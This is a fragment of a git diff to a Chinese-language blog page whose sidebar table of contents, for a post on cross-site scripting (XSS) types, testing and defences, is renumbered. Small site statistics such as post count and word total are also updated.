alert()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、XSS定义"><span class="nav-text">二、XSS定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、-XSS的原理"><span class="nav-text">三、 XSS的原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、XSS的攻击方式"><span class="nav-text">四、XSS的攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（一）反射型"><span class="nav-text">（一）反射型</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#场景一"><span class="nav-text">场景一</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（二）存储型（Stored-XSS）"><span class="nav-text">（二）存储型（Stored XSS）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#场景二"><span class="nav-text">场景二</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（三）DOM（Document-object-model）型XSS"><span class="nav-text">（三）DOM（Document object model）型XSS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#五、XSS漏洞测试"><span class="nav-text">五、XSS漏洞测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（一）方法一"><span class="nav-text">（一）方法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（二）方法二"><span class="nav-text">（二）方法二</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（三）方法三"><span class="nav-text">（三）方法三</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#六、攻击方式"><span class="nav-text">六、攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常见容易出现XSS漏洞的地方"><span class="nav-text">常见容易出现XSS漏洞的地方</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-数据交互的地方"><span class="nav-text">1.数据交互的地方</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-数据输出的地方"><span class="nav-text">2.数据输出的地方</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（一）反射性XSS"><span class="nav-text">（一）反射性XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（二）存储型XSS"><span class="nav-text">（二）存储型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（三）DOM型XSS"><span class="nav-text">（三）DOM型XSS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#七、XSS安全性分析"><span class="nav-text">七、XSS安全性分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意"><span class="nav-text">（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（二）这种在其他用户的浏览器中执行任意脚本的权限，赋予了攻击者有能力发动以下几类攻击"><span class="nav-text">（二）这种在其他用户的浏览器中执行任意脚本的权限，赋予了攻击者有能力发动以下几类攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#八、XSS的防御措施"><span class="nav-text">八、XSS的防御措施</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（一）调用函数"><span class="nav-text">（一）调用函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（二）使用XSS-Filter"><span class="nav-text">（二）使用XSS Filter</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#（1）输入过滤"><span class="nav-text">（1）输入过滤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（2）-输出编码（服务器端）"><span class="nav-text">（2） 输出编码（服务器端）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（三）白名单和黑名单结合"><span class="nav-text">（三）白名单和黑名单结合</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（四）Noscript"><span class="nav-text">（四）Noscript</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（五）Anti-XSS"><span class="nav-text">（五）Anti_XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（六）HttpOnly"><span class="nav-text">（六）HttpOnly</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（七）Web安全编码规范"><span class="nav-text">（七）Web安全编码规范</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（八）尽量使用WAF"><span class="nav-text">（八）尽量使用WAF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（九）防御DOM型XSS"><span class="nav-text">（九）防御DOM型XSS</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-JavaScript相关语法"><span class="nav-text">0x01 JavaScript相关语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-基础语法"><span class="nav-text">1 基础语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-wiondow-open-：是window对象中的open-方法"><span class="nav-text">2 wiondow.open()：是window对象中的open()方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-document-password-pass-value"><span class="nav-text">3 document.password.pass.value</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-javascript-alert"><span class="nav-text">4 javascript alert()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-XSS定义"><span class="nav-text">0x02 XSS定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-XSS的原理"><span class="nav-text">0x03  XSS的原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-XSS的攻击方式"><span class="nav-text">0x04 XSS的攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-反射型"><span class="nav-text">1 反射型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景一"><span class="nav-text">场景一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-存储型（Stored-XSS）"><span class="nav-text">2 存储型（Stored XSS）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景二"><span class="nav-text">场景二</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-DOM（Document-object-model）型XSS"><span class="nav-text">4 DOM（Document object model）型XSS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-XSS漏洞测试"><span class="nav-text">0x05 XSS漏洞测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-方法一"><span class="nav-text">1 方法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-方法二"><span class="nav-text">2 方法二</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-方法三"><span class="nav-text">3 方法三</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-攻击方式"><span class="nav-text">0x06 攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常见容易出现XSS漏洞的地方"><span class="nav-text">常见容易出现XSS漏洞的地方</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-数据交互的地方"><span class="nav-text">1.数据交互的地方</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-数据输出的地方"><span class="nav-text">2.数据输出的地方</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-反射性XSS"><span class="nav-text">1 反射性XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-存储型XSS"><span class="nav-text">2 存储型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-DOM型XSS"><span class="nav-text">3 DOM型XSS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-XSS安全性分析"><span class="nav-text">0x07 XSS安全性分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意"><span class="nav-text">（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（二）这种在其他用户的浏览器中执行任意脚本的权限，赋予了攻击者有能力发动以下几类攻击"><span class="nav-text">（二）这种在其他用户的浏览器中执行任意脚本的权限，赋予了攻击者有能力发动以下几类攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-XSS的防御措施"><span class="nav-text">0x08 XSS的防御措施</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-调用函数"><span class="nav-text">1 调用函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-使用XSS-Filter"><span class="nav-text">2 使用XSS Filter</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#（1）输入过滤"><span class="nav-text">（1）输入过滤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（2）-输出编码（服务器端）"><span class="nav-text">（2） 输出编码（服务器端）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-白名单和黑名单结合"><span class="nav-text">3 白名单和黑名单结合</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-Noscript"><span class="nav-text">4 Noscript</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-Anti-XSS"><span class="nav-text">5 Anti_XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-HttpOnly"><span class="nav-text">6 HttpOnly</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-Web安全编码规范"><span class="nav-text">7 Web安全编码规范</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-尽量使用WAF"><span class="nav-text">8 尽量使用WAF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-防御DOM型XSS"><span class="nav-text">9 防御DOM型XSS</span></a></li></ol></li></ol></div>
         
       </div>
       <!--/noindex-->
@@ -769,7 +769,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-count">32</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -907,12 +907,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">131k</span>
+    <span title="站点总字数">130k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:38</span>
+    <span title="站点阅读时长">3:37</span>
 </div>
 
 <!--
